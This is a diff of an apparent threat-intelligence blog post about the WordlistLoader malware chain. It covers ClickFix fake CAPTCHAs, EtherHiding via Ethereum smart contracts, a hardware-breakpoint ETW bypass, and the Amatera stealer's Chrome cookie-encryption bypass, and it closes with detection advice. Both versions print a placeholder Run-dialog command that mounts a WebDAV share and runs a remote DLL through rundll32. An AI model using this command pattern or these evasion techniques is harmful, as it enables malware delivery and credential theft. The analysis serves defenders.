@@ -3,49 +3,56 @@ title = "WordlistLoader: Shellcode Hidden as Plain English Words"
 date = "2026-08-24"
 +++
 
-The WordlistLoader analysis from August has the most novel encoding trick I've seen in a consumer-facing malware chain this year: the shellcode is stored as a sequence of plain English words, one word per byte. A lookup-table cipher where the ciphertext reads like grocery lists. AV parsers see words; the loader sees bytes. There's even a variant that swaps the wordlist for 16-byte UUID-encoded chunks, because one encoding scheme is a signature waiting to happen.
+WordlistLoader is an obfuscated loader that encodes shellcode as a dictionary of ordinary English words. Each byte of shellcode maps to a specific word in an array, allowing raw payload bytes to pass through text filters without triggering binary entropy detectors. A related variant maps shellcode to 16-byte UUID strings to accomplish the same obfuscation.
 
-## The chain
+## Multi-tier delivery architecture
 
-Everything upstream is the ClickFix family, and the infrastructure layering is the part worth diagramming:
+The delivery relies on the ClickFix social engineering pattern across several infrastructure layers:
 
 ```text
-compromised legit site (abogadosrosarinos[.]com, aptisweb[.]com, ...)
-  └─ injected Base64 JS blob
-      └─ fetches script from an ETHEREUM SMART CONTRACT   ← EtherHiding
-          └─ dynamically executes retrieved code
-              └─ ClickFix UI: fake "I'm not a robot" CAPTCHA
-                  └─ "paste this into Win+R and press Enter"
-                      └─ conhost → hidden cmd.exe → pushd WebDAV share
-                          └─ rundll32.exe loads the loader
-                              └─ WordlistLoader decodes word-list shellcode
-                                  └─ reflective loader → Amatera 4.3.3-alpha1
+Compromised website
+  └─ Injected base64 JavaScript
+      └─ Fetches stager script from an Ethereum smart contract (EtherHiding)
+          └─ Executes ClickFix fake CAPTCHA interface
+              └─ Prompts victim to execute command in Run dialog (Win+R)
+                  └─ conhost -> hidden cmd.exe -> mount WebDAV share
+                      └─ rundll32.exe executes remote DLL
+                          └─ WordlistLoader decodes shellcode
+                              └─ Reflective loading -> Amatera stealer
 ```
 
-Three layers of infrastructure laundering before a byte of payload: compromised sites, blockchain, and jsDelivr. The ClearFake operators moved primary hosting to `cdn.jsdelivr[.]net`, a legitimate CDN with no interest in scanning every npm/GitHub-sourced file it serves. Expel documented in January that jsDelivr pulls malicious repos fairly quickly, but it doesn't matter. EtherHiding makes the first stage a shell game: burned URLs swap for fresh ones, cost of a gas fee. The blockchain layer is the resurrection stone for dead links.
+The operators combine compromised web servers, public blockchain transactions, and CDN links like jsDelivr to host initial scripts. Using smart contracts allows the operators to update redirector URLs without changing the injected JavaScript on the compromised sites.
 
-The ClickFix command itself, from Microsoft's parallel WebDAV research, has three escalating variants. WordlistLoader uses the fancy one:
+The Run dialog command mounts a remote WebDAV share:
 
 ```batch
-:: advanced variant (WordlistLoader's flavor)
 conhost.exe --headless cmd.exe /c
-  <obfuscated env-var version of:>
   pushd \\webdav-share@SSL\path &
   rundll32.exe loader.dll,Entry
 ```
 
-`conhost --headless` kills the visible console. Environment-variable obfuscation plus delayed expansion hides `pushd`, `rundll32`, and the share host from eyeballs and static parsers. The WebDAV mount means the DLL never lives on disk where a file scanner owns the timeline. Microsoft saw the same skeleton delivering ACR Stealer between April and June with Python loaders. WordlistLoader is the replacement part in the same machine.
+Using `conhost --headless` hides console windows, while WebDAV mounts let `rundll32.exe` execute the DLL directly over the network without writing the file to the local disk.
 
-## The ETW bypass
+## ETW bypass via hardware breakpoints
 
-WordlistLoader patches ETW using a hardware-breakpoint method. The standard technique everyone implemented after the 2022 papers is patching `EtwEventWrite` with a `ret` at function entry. Hardware-breakpoint variants set a debug register on the function prologue. When the exception fires, the handler reroutes execution, leaving the code bytes untouched. Integrity checks that scan for the classic `0xC3` patch see a clean function. ETW is telemetry, not protection. Silencing it precedes everything else in the chain for a reason: the reflective loader and the syscall stunts downstream would otherwise narrate themselves to any EDR subscribed to the events.
+To prevent endpoint detection and response (EDR) agents from logging API calls, WordlistLoader neutralizes Event Tracing for Windows (ETW) using hardware breakpoints rather than in-memory patching. 
 
-## Amatera 4.3.3-alpha1
+Traditional ETW bypasses overwrite the entry point of `EtwEventWrite` with a return (`ret`, `0xC3`) instruction, which modern memory integrity scanners flag quickly. WordlistLoader instead sets a CPU debug register on the function prologue. When execution hits the breakpoint, the exception handler intercepts control and redirects execution around the logging routine, leaving the function bytes on disk and in memory unaltered.
 
-The payload ships with a version number that reads like a SaaS changelog, and the internals match: hardened syscall invocation through the WoW64 transition, dynamically generated x64 indirect-syscall trampolines invoked through Heaven's Gate (16-bit compatibility mode abuse, alive and well in 2026), and a redesigned Application-Bound Chrome encryption bypass credited as inspired by Remus Stealer. ABE bypass is the response to Google's app-bound cookie encryption, which was supposed to end the stealer era for Chrome cookies. The stealer era did not end. The bypass just got a release note.
+## Amatera payload capabilities
 
-## What the whole chain adds up to
+The final stage is Amatera (version 4.3.3-alpha1), an infostealer featuring several evasive techniques:
 
-What strikes me about the whole chain is the division of labor. A compromised website does the trust, a blockchain does the persistence, a CDN does the bandwidth, Windows' own binaries do the execution, a wordlist does the encoding, and a fake CAPTCHA does the social engineering. Not one component is sophisticated alone. The composite is a machine where every defensive control has a designated counter-layer: blocklists→blockchain, file AV→in-memory, ETW→hardware breakpoints, user caution→CAPTCHA theater.
+- Direct and indirect system call invocation through Heaven's Gate / WoW64 transitions to bypass user-mode hooks.
+- Bypasses for Google Chrome's Application-Bound Encryption (ABE) to extract protected cookie databases and saved credentials.
+- In-memory credential theft across Chromium and Gecko browsers.
 
-The detection anchor that still works, because it's the one thing the chain can't launder: ` rundll32.exe loading from a WebDAV UNC path` is a process/network behavior, not a file signature. Sysmon event 15 or any ESEN-equivalent catching `rundll32` with a `\\` path in the command line fires on all three WebDAV variants regardless of obfuscation. That, plus the boring human layer: nobody running a business has a legitimate reason to paste an admin command to solve a CAPTCHA. "I'm not a robot" that requires running code makes you exactly the robot.
+## Detection opportunities
+
+While individual layers swap URLs and obfuscation schemes, the execution behavior leaves recognizable indicators:
+
+Audit `rundll32.exe` command lines for WebDAV UNC paths (`\\*\...`). Executing DLLs directly from remote UNC paths over WebDAV is rare in legitimate administrative environments. Sysmon Event ID 1 (Process Creation) capturing `rundll32` targeting remote paths provides high-fidelity detection.
+
+Monitor processes manipulating CPU debug registers (`GetThreadContext` and `SetThreadContext`) outside debugging tools.
+
+Educate users on ClickFix prompts. Legitimate verification dialogs never require users to open the Windows Run dialog or paste terminal commands into an administrative shell.
